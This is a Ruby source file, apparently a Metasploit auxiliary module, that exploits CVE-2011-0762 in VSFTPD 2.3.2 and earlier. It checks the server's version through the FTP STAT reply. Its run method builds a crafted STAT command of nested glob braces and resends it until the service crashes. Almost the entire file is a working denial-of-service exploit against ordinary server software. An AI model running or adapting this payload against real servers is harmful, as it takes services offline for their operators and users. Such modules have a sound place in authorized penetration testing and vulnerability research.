##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VSFTPD 2.3.2 and Earlier STAT Denial of Service',
        'Description' => %q{
          This module triggers a Denial of Service condition in the VSFTPD server in
          versions before 2.3.3 (tested on 2.3.0, 2.3.1, and 2.3.2).
          Version 2.3.3 and higher should not be vulnerable.
        },
        'Author' => [
          'Nick Cottrell (Rad10Logic) <ncottrellweb[at]gmail.com>', # Module Creator
          'Anna Graterol <annagraterol95[at]gmail.com>', # Vuln researcher
          'Mana Mostaani <mana.mostaani[at]gmail.com>',
          'Maksymilian Arciemowicz', # Original EDB PoC
          'g0tmi1k' # @g0tmi1k - additional features
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '46617' ],
          [ 'CVE', '2011-0762' ],
          [ 'EDB', '16270' ]
        ],
        'DisclosureDate' => '2011-02-03',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptInt.new('MAX_ATTEMPTS', [false, 'Maximum payload attempts before giving up (0 = unlimited)', 25])
    ])
  end

  def report_ftp_vuln(version = nil)
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: 'ftp',
      name: name,
      info: version ? "VSFTPD #{version} is vulnerable to STAT DoS" : 'VSFTPD is vulnerable to STAT DoS',
      refs: references
    )
  end

  def check
    # attempt to connect
    begin
      return Exploit::CheckCode::Unknown('Failed to connect or authenticate via FTP') unless connect_login
    rescue Rex::ConnectionRefused
      return Exploit::CheckCode::Unknown('Connection refused by the target')
    rescue Rex::ConnectionTimeout
      return Exploit::CheckCode::Unknown('Connection timed out')
    end

    vprint_status("FTP banner: #{sanitize_ftp_response(banner)}") if banner

    s = ''
    attempts = 0
    max = datastore['MAX_ATTEMPTS'].to_i
    loop do
      attempts += 1

      # get each line until our desired line shows or end line shows
      s = send_cmd(['STAT'], true)
      break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")

      if max > 0 && attempts > max
        print_error("Reached #{max} attempts")
        break
      end
    end

    vprint_status("STAT: #{s}")

    # check if version was found
    if s !~ /vsFTPd \d+\.\d+\.\d+/
      print_error('Did not find FTP version in FTP session')
      return Exploit::CheckCode::Unknown('Could not determine VSFTPD version')
    end

    # pull out version and check if its in range of vulnerability
    version = s[/vsFTPd (\d+\.\d+\.\d+)/, 1]
    if Rex::Version.new(version) < Rex::Version.new('2.3.3')
      report_ftp_vuln(version)
      Exploit::CheckCode::Appears("VSFTPD #{version} is vulnerable (affected: <= 2.3.2)")
    else
      Exploit::CheckCode::Safe("VSFTPD #{version} is not vulnerable (affected: <= 2.3.2)")
    end
  ensure
    disconnect
  end

  def run
    payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
    vprint_status("FTP DoS command: #{payload}")

    attempts = 0
    max = datastore['MAX_ATTEMPTS'].to_i
    loop do
      attempts += 1
      if max > 0 && attempts > max
        print_error("Reached #{max} attempts without DoS")
        break
      end
      print_status("Attempt: #{attempts}/#{max} - Sending DoS command")

      connect_login

      10.times do
        send_cmd([payload.to_s], false)
      end
      send_cmd([payload.to_s], true)
    rescue Rex::ConnectionTimeout
      print_error('Connection timeout! Sending again')
    rescue Errno::ECONNRESET
      print_error('Connection reset!')
    rescue Rex::ConnectionRefused
      print_good('Connection refused! Appears DoS attack succeeded')
      report_ftp_vuln
      break
    rescue EOFError
      print_good('Stream was cut off abruptly. Appears DoS attack succeeded')
      report_ftp_vuln
      break
    end
  ensure
    disconnect
  end
end
